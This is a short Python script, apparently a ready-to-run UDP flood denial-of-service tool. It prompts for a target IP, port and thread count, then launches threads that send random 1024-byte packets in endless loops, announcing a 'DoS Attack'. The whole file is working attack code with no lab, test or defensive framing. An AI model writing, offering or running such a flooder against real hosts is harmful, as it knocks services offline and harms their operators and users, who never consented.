import socket
import threading
import random
import time

def flood(target_ip, target_port, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            data = random._urandom(1024)
            sock.sendto(data, (target_ip, target_port))
            print(f"[Thread-{thread_id}] Sent packet to {target_ip}:{target_port}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[Thread-{thread_id}] Error: {e}")

def start_attack(ip, port, threads):
    print(f"\n[!] Launching DoS Attack on {ip}:{port} with {threads} threads.\n")
    for i in range(threads):
        t = threading.Thread(target=flood, args=(ip, port, i))
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack manually stopped.")

if __name__ == "__main__":
    ip = input("Target IP: ")
    port = int(input("Target Port: "))
    threads = int(input("Number of Threads: "))
    start_attack(ip, port, threads)